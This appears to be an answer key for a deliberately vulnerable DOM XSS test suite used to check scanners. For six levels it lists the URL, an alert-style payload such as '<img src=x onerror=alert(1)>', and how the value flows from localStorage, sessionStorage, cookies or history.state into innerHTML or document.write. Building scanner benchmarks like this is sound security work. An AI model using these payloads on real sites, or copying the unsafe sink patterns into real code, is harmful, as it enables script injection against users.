# clientstate — solutions

DOM XSS where the source is client-side persisted state — `localStorage`,
`sessionStorage`, `document.cookie`, or `history.state`. Each level seeds the
store from the URL on load (so one navigation triggers it) and then reads the
value back into an HTML sink. These storage/cookie/history reads are standard
DOM-XSS sources; the test is whether a scanner traces taint through the store.

### clientstate-level1

`/clientstate/level1/?pref=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: URL `pref` → `localStorage.setItem('pref', ...)` → `innerHTML =
  localStorage.getItem('pref')`.

### clientstate-level2

`/clientstate/level2/?q=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: URL `q` → `sessionStorage` → `document.write('You searched for: ' +
  last)`.

### clientstate-level3

`/clientstate/level3/?draft=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: URL `draft` → `localStorage` → `editor.insertAdjacentHTML('beforeend',
  saved)`.

### clientstate-level4

`/clientstate/level4/?theme=%3Csvg/onload=alert(1)%3E`

- payload: `<svg/onload=alert(1)>` (slash separators avoid the cookie `;`/space
  value boundary)
- context: URL `theme` → `document.cookie = 'theme=...'` → read back via cookie
  regex → `innerHTML`.

### clientstate-level5

`/clientstate/level5/?note=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: URL `note` → `history.replaceState({note: ...})` → `innerHTML =
  history.state.note`.

### clientstate-level6

`/clientstate/level6/?bio=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: URL `bio` → `localStorage.setItem('profile', JSON.stringify({bio}))`
  → `JSON.parse(...)` → `innerHTML = profile.bio`.
